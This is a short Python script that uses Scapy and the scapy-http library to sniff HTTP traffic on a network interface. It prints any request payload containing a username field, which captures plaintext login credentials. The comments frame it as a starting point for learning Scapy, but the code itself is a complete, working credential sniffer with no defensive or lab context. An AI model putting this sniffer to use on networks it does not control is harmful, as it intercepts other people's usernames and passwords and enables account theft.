# this is a beginning script for a packet sniffer only for HTTP username and password purpose
# IMPORTANT NOTE: This can be a good start on understanding SCAPY in a protocol level which covers both networking and python
#here i am searching for uname // this can be changed based on the requirements!!
# pip install scapy-http (http filter is not inbuilt in scapy, this is a 3rd party library)
import scapy.all as scapy
from scapy.layers import http
import re
def sniffer(interface):
        scapy.sniff(store=False, iface=interface, prn=sniffed_packet)
def sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
                if packet.haslayer(scapy.Raw):
                        load = packet[scapy.Raw].load.decode()
                        if re.search(r"\buname", load):
                                print(load)

sniffer("eth0")

